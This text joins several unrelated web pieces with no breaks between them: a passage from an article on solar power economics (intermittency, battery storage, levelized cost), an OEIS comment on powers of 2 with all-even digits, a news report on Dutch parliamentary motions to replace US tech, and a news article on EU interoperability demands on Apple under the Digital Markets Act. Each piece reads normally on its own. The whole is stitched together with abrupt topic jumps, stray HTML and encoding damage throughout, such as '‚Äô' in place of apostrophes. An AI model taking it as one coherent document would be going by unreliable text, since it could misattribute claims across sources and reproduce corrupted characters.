sunlight nearly 24 hours a day. This is known as </span><a href="https://en.wikipedia.org/wiki/Space-based_solar_power" rel="">space-based solar power</a><span>. Historically the costs and difficulties of launching panels into space and transmitting the energy back to earth have made this type of solar largely theoretical, but the idea of 24/7 solar is enticing and </span><a href="https://www.aetherflux.com/" rel="">there‚Äôs always someone trying to make it happen</a><span>.</span></p></li></ul><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2a78bb58-b700-432c-b7ae-95d163fed0b7_1600x785.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2a78bb58-b700-432c-b7ae-95d163fed0b7_1600x785.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2a78bb58-b700-432c-b7ae-95d163fed0b7_1600x785.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2a78bb58-b700-432c-b7ae-95d163fed0b7_1600x785.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2a78bb58-b700-432c-b7ae-95d163fed0b7_1600x785.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2a78bb58-b700-432c-b7ae-95d163fed0b7_1600x785.png" width="1456" height="714" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/2a78bb58-b700-432c-b7ae-95d163fed0b7_1600x785.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:714,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2a78bb58-b700-432c-b7ae-95d163fed0b7_1600x785.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2a78bb58-b700-432c-b7ae-95d163fed0b7_1600x785.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2a78bb58-b700-432c-b7ae-95d163fed0b7_1600x785.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2a78bb58-b700-432c-b7ae-95d163fed0b7_1600x785.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption><span>Solar cell efficiency over time, via </span><a href="https://www.nrel.gov/pv/cell-efficiency.html" rel="">NREL</a><span>.</span></figcaption></figure></div><p>The other way to deal with intermittency is by adding some form of energy storage. There are a variety of ways that this could be done ‚Äî using electricity from our PV panels to spin a flywheel, or pump water uphill, or synthesize methane to later burn ‚Äî but in practice today most new energy storage is in the form of large lithium-ion batteries.</p><p>In practice, dealing with intermittency requires both increasing the power produced by our panels and adding storage. Without storage, the biggest ground-based solar array in the world still produces zero power at night, and storage is only useful if our PV system is large enough to produce excess energy beyond what‚Äôs needed for immediate consumption.</p><p>What‚Äôs the relative value of additional solar PV capacity vs. additional storage? We can understand this by running simulations with different amounts of solar panel capacity and energy storage, and comparing it to the power demand for our theoretical single family home. The graph below shows power generated for our single family home at different solar PV capacities, without any storage.</p><p>With solar panels alone, we max out at slightly less than 50% of annual power demand met by our solar PV system: no matter how many panels we add, our system still can‚Äôt provide any power at night. But let‚Äôs see what it looks like when we start adding storage capacity.</p><p>As we increase the amount of storage, we can supply greater and greater proportions of our household‚Äôs electricity demand, reaching over 99% with 42 kilowatts (~200 square meters) of PV capacity and 80 kilowatt-hours of storage. This is around four times our maximum household power consumption, and roughly 40% more storage than the capacity of a base Tesla Model 3.</p><p>But both our storage capacity and our solar PV capacity are subject to diminishing returns. Each additional square meter of panel and kilowatt-hour of storage supplies a smaller and smaller proportion of our overall electricity demand, meaning each additional kilowatt-hour of electricity provided is more expensive than the last. We can supply 25% of our household‚Äôs electricity demands with 15 square meters of panels. But supplying 75% requires not three times the panel area (45 meters) but more than five times (85 meters), plus 20 kilowatt-hours of energy storage. And going from meeting 75% of demand to 95% of demand requires roughly doubling the size of the system, to 135 square meters of panels and 50 kilowatt-hours of storage.</p><p>So, while solar can easily supply relatively small fractions of electricity demand, this gets harder and harder, requiring more and more infrastructure, the greater the fraction of our energy we want solar to supply. For our simulated household, meeting 100% electricity demand requires 52 kilowatts (about 250 square meters) worth of panels, roughly five times our peak yearly consumption, and enough storage to power our house for almost four days straight during the summer. And even this might not be enough if we got a bad string of cloudy winter days. (The exact size of the system needed to meet ~100% demand can vary, with fewer panels trading off against more storage to some extent, but the basic point remains.)</p><p>But if solar and storage gets cheap enough, this ‚Äúoverbuilding‚Äù becomes much less of a concern: low enough costs mean that the system can remain competitive even as each additional kilowatt-hour gets more expensive than the last. When buying a new computer, no one worries about wasting money on excess hard drive space that only rarely gets used: hard drive capacity is so inexpensive we can just buy enormous quantities of it to cover whatever our future needs might be. So understanding the potential of solar PV means understanding what its cost trajectory looks like.</p><p>The costs of a solar PV system can be broken down into hard costs, soft costs, and operation and maintenance (O&amp;M) costs. Hard costs are the costs of the physical solar system itself: the photovoltaic panels, the inverters, the racking, the labor required to install it, and so on. Soft costs are design work, permitting, developer overhead, and other things not directly associated with building the physical system. O&amp;M costs are those incurred during the course of operation, including insurance, land leases, cleaning, replacing damaged parts, and so on. Below is a current hard and soft cost breakdown for fixed-tilt utility-scale solar in the US.</p><p><span>Overall US costs are slightly more than $1,000 per kilowatt. We see that thanks to 70 years of learning curve improvements, the solar PV cells themselves are less than 1/3rd the cost of the overall system. The shrinking fraction of the cost of PV cells vs the rest of the system are why there‚Äôs interest in things like ground-mounted solar which can </span><a href="https://www.canarymedia.com/articles/solar/utility-scale-solar-has-stagnated-so-erthos-mounts-pv-panels-right-on-the-ground" rel="">eliminate racking entirely</a><span>, and reducing installation costs by </span><a href="https://www.nytimes.com/2024/07/30/climate/solar-panels-robots-maximo-construction.html" rel="">robotically installing solar panels</a><span>.</span></p><p><span>With storage, we see a broadly similar pattern. The costs of utility-scale storage can be broken down into the hard costs of the system itself, various soft costs associated with installing it, and ongoing maintenance costs. As with solar PV, the costs of lithium-ion batteries have steadily fallen over time due to various </span><a href="https://www.construction-physics.com/p/how-we-got-the-lithium-ion-battery" rel="">learning curve effects</a><span> (increasing scale, more materially efficient batteries, and so on), though the costs of the battery itself remains a larger fraction of overall storage system cost than the module is for solar PV.</span></p><p>These are capital costs, but what about operations and maintenance (O&amp;M) costs? Because solar and storage systems don‚Äôt require purchasing fuel, and have almost no moving parts, operations and maintenance costs are low. NREL estimates that for utility PV, O&amp;M is about $16 dollars per kilowatt per year, or about 1.5% of capital costs annually.</p><p><span>For maintenance costs for battery storage, NREL doesn‚Äôt give a line-item breakdown, but </span><a href="https://atb.nrel.gov/electricity/2024/utility-scale_battery_storage" rel="">estimates</a><span> the annual cost of O&amp;M for battery storage is about 2.5% of the capital cost, or around $12 per kilowatt-hour for current US battery costs.</span></p><p>We can put this all together to calculate the levelized cost of electricity (LCOE) for our solar plus storage system and different fractions of electricity supplied. LCOE is simply the cost of an electric power generation system, divided by the amount of electricity it produces, and adjusted by the discount rate (which reduces both the present-day costs of future payments and the present-day value of future electricity generated).</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F846a53f1-5c3f-4f11-9b11-068648eae089_540x73.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F846a53f1-5c3f-4f11-9b11-068648eae089_540x73.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F846a53f1-5c3f-4f11-9b11-068648eae089_540x73.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F846a53f1-5c3f-4f11-9b11-068648eae089_540x73.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F846a53f1-5c3f-4f11-9b11-068648eae089_540x73.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F846a53f1-5c3f-4f11-9b11-068648eae089_540x73.png" width="540" height="73" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/846a53f1-5c3f-4f11-9b11-068648eae089_540x73.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:73,&quot;width&quot;:540,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F846a53f1-5c3f-4f11-9b11-068648eae089_540x73.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F846a53f1-5c3f-4f11-9b11-068648eae089_540x73.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F846a53f1-5c3f-4f11-9b11-068648eae089_540x73.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F846a53f1-5c3f-4f11-9b11-068648eae089_540x73.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><span>(In reality, it would not be possible to build a small-scale solar system for these costs; </span><a href="https://www.energy.gov/eere/solar/solar-photovoltaic-system-cost-benchmarks" rel="">residential solar PV costs are much higher.</a><span> The purpose is to illustrate how costs vary as solar PV serves a larger fraction of electricity demand. Though we‚Äôre simulating a single home, the same principles apply to grid-scale demand.)</span></p><p>Below is a graph showing LCOE for the different combinations of solar PV capacity and energy storage we looked at earlier. This is based on the following parameters, which are roughly current for US utility-scale solar:</p><ul><li><p>Solar panel cost: $1100 per kilowatt, $17 per kw per year O&amp;M</p></li><li><p>Battery cost: $476 per kilowatt-hour, $12 per kwh per year O&amp;M</p></li><li><p>Solar panel lifetime: 35 years</p></li><li><p>Battery lifetime: 20 years</p></li><li><p>Solar panel capacity factor: ~20% (varies depending on cloud simulation)</p></li><li><p>Solar cell efficiency: 21%</p></li><li><p>Discount rate: 7%</p></li></ul><p><span>We can see that without any sort of storage, and with low amounts of solar (where the power can simply be used immediately without any going to waste), our solar system costs around 5.7 cents per kilowatt-hour. This is smack dab in the middle of what </span><a href="https://www.lazard.com/media/xemfey0k/lazards-lcoeplus-june-2024-_vf.pdf" rel="">Lazard lists</a><span> as the current range for LCOE for utility-scale solar in the US, and slightly more than the </span><a href="https://emp.lbl.gov/sites/default/files/utility_scale_solar_2023_edition_slides.pdf#:~:text=premiums%E2%80%94discussed%20later%29,trends" rel="">average LCOE for recently built US utility-scale solar plants</a><span>.</span></p><p>However, as we expand the size of our system to serve a greater fraction of our electricity demand, our cost per kilowatt-hour quickly rises. At 50% of electricity served, we‚Äôre at 13 cents a kilowatt-hour. At 70% we‚Äôre over 16 cents. At 90%, we‚Äôre nearly 25 cents.</p><p>How much does this change if solar and storage costs continue to fall? The below graph shows electricity costs at current US costs for solar and storage, compared to the current European costs ($750 per kW for PV, $300 per kWh for storage), and potentially future achievable costs ($400 per kw for solar, and $150 kWh for storage).</p><p><span>Even just driving down costs to the point of the current efficient frontier would cut the costs of US solar by roughly a third, allowing for costs less than 10 cents a kilowatt hour in our model even at 50% of electricity supplied. If costs could be driven down even further, to what experts project we might reach (BloombergNEF projects a future cost of $400 per kilowatt for solar), we could reach nearly 80% of electricity demand with solar and storage for 10 cents a kilowatt hour, roughly the average cost for residential electricity generation in the US today.</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-4-159434840" href="https://www.construction-physics.com/p/understanding-solar-energy#footnote-4-159434840" target="_self" rel="">4</a></span></p><p><span>Of course, there‚Äôs no guarantee that solar costs will continue to fall. Even if the learning curves for batteries and solar cells continue (and they might not: learning curves work until they don‚Äôt), solar costs might stay flat or even increase if we don‚Äôt find ways to drive down the costs of other parts of the system. We‚Äôre already seeing this to some extent. Per the </span><a href="https://seia.org/research-resources/solar-market-insight-report-q4-2024/" rel="">Solar Energy Industry Association</a><span>, utility-scale solar costs in the US have been roughly flat for the last six years, even as module costs have fallen, due to rising costs elsewhere in the system.</span></p><p>The main advantage of solar, aside from environmental considerations, is its low cost. A solar cell requires no fuel, has no moving parts, can be produced in large-scale factories in enormous volumes, and requires very little maintenance. Lay it down on the ground and it will start generating electric power, no muss no fuss.</p><p><span>The main drawback of solar is that we can‚Äôt control when the sun shines: day/night cycles, clouds, and seasonal changes in the sun‚Äôs position all reduce how much our solar panel generates, and make it hard to generate a given amount of electricity </span><em>reliably</em><span>. The greater the share of electricity supplied by solar power, the more extensive the infrastructure required to overcome this drawback, and the higher the cost.</span></p><p>But as the costs of solar continue to fall, this drawback becomes less binding, and it becomes economically justifiable to ‚Äúoverbuild‚Äù solar infrastructure and use it to serve increasingly large fractions of our energy demand.</p><p><em>Thanks to Austin Vernon for reading a draft of this post.

                                 <p>Evidence that the sequence may be finite, from <a href="https://oeis.org/wiki/User:Rick_L._Shepherd">Rick L. Shepherd</a>, Jun 23 2002:</p>
                             
                                 <p>1) The sequence of last two digits of 2^n, <a href="https://oeis.org/A000855" title="Final two digits of 2^n.">A000855</a> of period 20, makes clear that 2^n &gt; 4 must have n == 3, 6, 10, 11, or 19 (mod 20) for 2^n to be a member of this sequence. Otherwise, either the tens digit (in 10 cases), as seen directly, or the hundreds digit, in the 5 cases receiving a carry from the previous power's tens digit &gt;= 5, must be odd.</p>
                             
                                 <p>2) No additional term has been found for n up to 50000.</p>
                             
                                 <p>3) Furthermore, again for each n up to 50000, examining 2^n's digits leftward from the rightmost but only until an odd digit was found, it was only once necessary to search even to the 18th digit. This occurred for 2^12106 whose last digits are ...3833483966860466862424064. Note that 2^12106 has 3645 digits. (The clear runner-up, 2^34966, a 10526-digit number, required searching only to the 15th digit. Exponents for which only the 14th digit was reached were only 590, 3490, 8426, 16223, 27771, 48966 and 49519 - representing each congruence above.)</p>

<p>Not content to wait for open letters to influence the European Commission, Dutch parliamentarians have taken matters into their own hands by passing eight motions urging the government to ditch US-made tech for homegrown alternatives.</p>
<blockquote>

<p>With each IT service our government moves to American tech giants, we become dumber and weaker...</p>
</blockquote>
<p>The motions were <a target="_blank" href="https://www.tweedekamer.nl/debat_en_vergadering/plenaire_vergaderingen/details/activiteit?id=2025A02077#:~:text=Moties%20ingediend%20bij%20het%20debat%20over%20migraties%20van%20overheids%2DICT%20naar%20het%20buitenland" rel="nofollow">submitted</a> and all passed yesterday during a discussion in the Netherlands' House of Representatives on concerns about government data being shipped overseas. While varied, they all center on the theme of calling on the government to replace software and hardware made by US tech companies, acquire new contracts with Dutch companies who offer similar services, and generally safeguard the country's digital sovereignty.</p>
<p>"With each IT service our government moves to American tech giants, we become dumber and weaker," Dutch MP Barbara Kathmann, author of four of the motions, told <em>The Register</em>. "If we continue outsourcing all of our digital infrastructure to billionaires that would rather escape Earth by building space rockets, there will be no Dutch expertise left."</p>
<p>Kathmann's measures specifically call on the government to stop the migration of Dutch information and communications technology to American cloud services, the creation of a Dutch national cloud, the repatriation of the .nl top-level domain to systems operating within the Netherlands, and for the preparation of risk analyses and exit strategies for all government systems hosted by US tech giants. The other measures make similar calls for eliminating the presence of US tech companies in government systems and the preference of local alternatives.</p>
<p>"We have identified the causes of our full dependency on US services," Kathmann told us. "We have to start somewhere ‚Äì by pausing all thoughtless migrations to American hyperscalers, new opportunities open up for Dutch and European providers."</p>

    

<p>The motions passed by the Dutch parliament come as the Trump administration ratchets up tensions with a number of US allies ‚Äì the EU among them. Nearly 100 EU-based tech companies and lobbyists sent an <a target="_blank" href="https://www.theregister.com/2025/03/17/european_tech_sovereign_fund/">open letter</a> to the European Commission this week asking it to find a way to divest the bloc from systems managed by US companies due to "the stark geopolitical reality Europe is now facing."</p>

        


        

<p>Concerns over European reliance on US tech companies are mounting, with tech experts in the EU <a target="_blank" href="https://www.theregister.com/2025/03/03/microsoft_unveils_a_finalized_eu/">sounding the call</a> as the Trump administration's international posture becomes increasingly bellicose.&nbsp;</p>
<p>Boffins in the Netherlands, in particular, <a target="_blank" href="https://www.theregister.com/2025/02/26/europe_has_second_thoughts_about/">rang the alarm</a> in February, with Dutch Electoral Council technical advisor Bert Hubert warning that using US cloud services was no longer safe for either the government or civil society.</p>

        

<p>It's perhaps for that reason that parliamentarians have been considering the motions passed yesterday for a while, as Kathmann explained.</p>
<p>"The US government has made the call for tech sovereignty an urgent geopolitical issue," Kathmann said. "We support EU tech's open letter, but these motions have a longer history."</p>

</ul>
<p>Kathmann told us her party, an opposition coalition of the Green and Labor parties, had been working with the governing centrist party, New Social Contract, to develop a new Dutch-centric tech plan since last year, the need for which has been made more pressing as American rhetoric shifts.</p>
<p>"The willingness of the Trump government to use their Big Tech monopoly to put political pressure on European governments, like the threat made to the International Criminal Court, and the attack on European tech laws (DSA, DMA) by VP Vance at the Munich Security Council, have shaken up Dutch politics," Kathmann said.</p>
<h3>Will the government actually act?</h3>
<p>If the Dutch government takes action, the Netherlands would be the first European nation to repatriate its tech stack from US companies as relations sour. The government is under no obligation to conform to the nonbinding motions, however.</p>
<p>"With eight out of eight proposals passed, it's almost impossible for the government to not take action," Kathmann insisted. "The State Secretary is not legally obligated to follow up on motions, but not acting on such a broad majority in parliament is nearly unheard of."</p>
<p>A spokesperson for the House of Representatives told us "almost all" motions put to the House are accepted, which may mean that the eight-for-eight passage puts less pressure on the government than Kathmann hopes.</p>

        

<p>That said, a ninth measure discussed alongside the other eight motions also passed, and the government has already accepted it. That particular measure, which asks the government to increase cooperation in the government service when it comes to implementing information provisions and digitization policies, doesn't mention divestment from US tech companies. Nonetheless, its passage signals the government is paying attention.</p>
<p>"Our party will do whatever we can to keep the government to the parliamentary calls to action," Kathmann said.&nbsp;¬Æ</p>

<div id="readability-page-1" class="page"><div>
<p id="speakable-summary">The European Union has sent Apple <a href="https://ec.europa.eu/commission/presscorner/detail/en/ip_25_816" target="_blank" rel="noreferrer noopener nofollow">preliminary instructions</a> on how it expects the iPhone maker to comply with interoperability provisions in the bloc‚Äôs Digital Markets Act (DMA), its flagship market contestability reform.</p>

<p>According to the Commission, device manufacturers and app developers should be able to access nine iOS connectivity features that were restricted to Apple‚Äôs exclusive use before, such as peer-to-peer Wi-Fi connectivity, NFC features and device pairing. As a result, Bluetooth headphones, smartwatches, connected TVs, or other, non-Apple devices should work better with an iPhone.</p>







<p>Google could use this opportunity to make AirDrop work with Android devices. Headphone manufacturers could support SharePlay, a feature that only works with AirPods for now.</p>

<p>This follows the Commission‚Äôs opening of two specification proceedings on Apple <a href="https://techcrunch.com/2024/09/19/eu-to-tell-apple-how-to-do-interoperability-dma-style/">back in September</a> ‚Äî one of which focused on ensuring the DMA‚Äôs interoperability requirements are effectively met when it comes to Apple allowing connected devices to tap into iOS‚Äôs connectivity features, including notifications and device pairing.&nbsp;</p>

<p>The second concerns requests for interoperability made by third-party app developers with features of Apple‚Äôs iOS and iPadOS platforms. In that case, the Commission recommends improved access to technical documentation as well as better communication with third-party companies using those features. The EU is asking for ‚Äútimely communication and updates, and a more predictable timeline for the review of interoperability requests.‚Äù</p>

<p>The proceedings are possible because Apple has been designated as a ‚Äúgatekeeper‚Äù under the DMA, with both its mobile platforms subject to the regulation‚Äôs interoperability rules for so-called ‚Äúcore platform services.‚Äù (Reminder: Penalties for non-compliance with the DMA can reach up to 10% of global annual turnover.)&nbsp;</p>

<p>While the legislation contains plenty of upfront details about how gatekeepers are expected to comply with the various provisions ‚Äî such as bans on gatekeepers self-preferencing and, indeed, interoperability mandates ‚Äî the law also allows the Commission to set out more specific instructions where it believes extra detail is needed to ensure effective compliance.</p>


<p>The EU is concerned that Apple is not providing a level playing field for third-party connected devices to integrate with its platforms ‚Äî to, for example, be able to properly display iOS notifications on a non-Apple smartwatch screen, or have a smooth iPhone pairing experience with a (non-Apple) smart speaker.&nbsp;</p>

<p>Apple isn‚Äôt happy about either the DMA, in general, or these specific interoperability mandates.&nbsp;</p>

<p>In the case of the latter, it accuses the EU of singling out its business ‚Äî since no other gatekeepers have been subject to specification proceedings, as yet.&nbsp;</p>







<p>In a background briefing with journalists ahead of the EU releasing preliminary findings on the proceedings, Apple also attacked the Commission‚Äôs actions as anti-innovation, framing the moves as meddling micromanagement by public officials.&nbsp;</p>

<p>The company argues that the bloc‚Äôs actions could end up limiting which technologies and features it makes available in the region since it said the DMA will mean it‚Äôs forced to make all its innovations immediately available to rivals ‚Äî suggesting it will therefore have to invest engineering time in testing and debugging third-party integrations prior to shipping new features in the EU.&nbsp;</p>

<p>Additionally, Apple claims the specification proceedings could lead to dire consequences for its European users‚Äô privacy and security ‚Äî since it says the bloc is requiring that it sends unencrypted data to third parties. According to Apple, the Commission rejected suggestions it made to try and mitigate some of these risks.&nbsp;&nbsp;</p>

<p>Apple claims the interoperability requirements mean it will be forced to expose potentially sensitive user data ‚Äî from notifications containing personal messages or one-time codes, to details of Wi-Fi networks users have joined ‚Äî to outside developers that could abuse the information for tracking and profiling.&nbsp;</p>

<p>Social media ad giant Meta ‚Äî whose business empire is based on tracking and profiling to sell ads ‚Äî has been a leading requester of app interoperability capabilities, per Apple.</p>

<p>Because of the EU‚Äôs interpretation of the law, Apple also says it will be unable to take steps to protect users from entities seeking to use the DMA to obtain unfettered access to their information for their own commercial gain.&nbsp;</p>

<p>Apple also told TechCrunch the EU barred Apple from providing information to users about potential risks when they agree to receive their iOS notifications on a third-party device ‚Äî in this case users will see a pop-up, per Apple, but it will just ask if they wish to receive their notifications on the connected device, without the additional context the company believes users should also be given.&nbsp;</p>

<p>So-called Apple ‚Äúscare screens‚Äù ‚Äî aka, info pop-ups related to third-party transactions, interactions, or access where the company frames contact with external entities as risky for its users ‚Äî have been a perennial gripe of some developers, including those who lobbied the EU to pass the DMA, as they suggest the company deploys such tactics maliciously, to undermine the openness the regulation is shooting for.&nbsp;</p>







<p>In a statement following the EU‚Äôs preliminary decision on the specification proceedings, Apple said: ‚ÄúToday‚Äôs decisions wrap us in red tape, slowing down Apple‚Äôs ability to innovate for users in Europe and forcing us to give away our new features for free to companies who don‚Äôt have to play by the same rules. It‚Äôs bad for our products and for our European users. We will continue to work with the European Commission to help them understand our concerns on behalf of our users.‚Äù</p>

<h2 id="h-a-level-playing-field">A level playing field</h2>

<p>While Apple frames the DMA as anti-innovation, several smaller companies have been complaining about the company‚Äôs (lack of) interoperability. Earlier this week, when Pebble creator Eric Migicovsky <a href="https://techcrunch.com/2025/03/18/pebble-creator-unveils-the-first-new-pebble-inspired-smartwatches/">unveiled its new smartwatches</a>, he also wrote <a href="https://ericmigi.com/blog/apple-restricts-pebble-from-being-awesome-with-iphones" target="_blank" rel="noreferrer noopener nofollow">a lengthy blog post</a> explaining all of Apple‚Äôs restrictions that make third-party smartwatches worse than the Apple Watch.</p>

<p>‚ÄúThere is no way for us to support all the functionality that Apple Watch has access to. It‚Äôs impossible for a 3rd party smartwatch to send text messages, or perform actions on notifications (like dismissing, muting, replying) and many, many other things,‚Äù Migicovsky wrote.</p>

<p>Migicovsky describes his new company as ‚Äúa labour of love‚Äù for people looking for a fun, hackable smartwatch. And he disagrees with Apple‚Äôs attacks on the DMA. ‚ÄúThey‚Äôre clearly using their market power to lock consumers into their walled ecosystem. This causes there to be less competition, which increases prices and reduces innovation,‚Äù Migicovsky wrote.</p>

<p>And things have become <em>harder</em> for third-party smartwatch companies in recent years. Since iOS 13, notification content previews are hidden on your iPhone lockscreen by default until you unlock your iPhone. As a result, smartwatch makers can‚Äôt get the content of your notifications unless users manually enable full content previews on the lockscreen.</p>

<p>Instead of asking users to weaken the security level on iOS, Migicovsky would like to be able to use the same APIs that the Apple Watch is currently using. ‚ÄúIf you live in Europe, thank you for voting for representatives who passed the DMA. We will be petitioning Apple under DMA Article 6 to request interoperability with Apple Watch APIs,‚Äù he wrote.</p>

<p>While Migicovsky is this week‚Äôs vocal opponent of Apple‚Äôs platform restrictions, many startup founders are quietly nodding in agreement. According to them, Apple should allocate a small portion of its development resources to create a level playing field, allowing anyone to innovate and compete fairly with the tech company that currently has the greatest market capitalization in the world.</p>
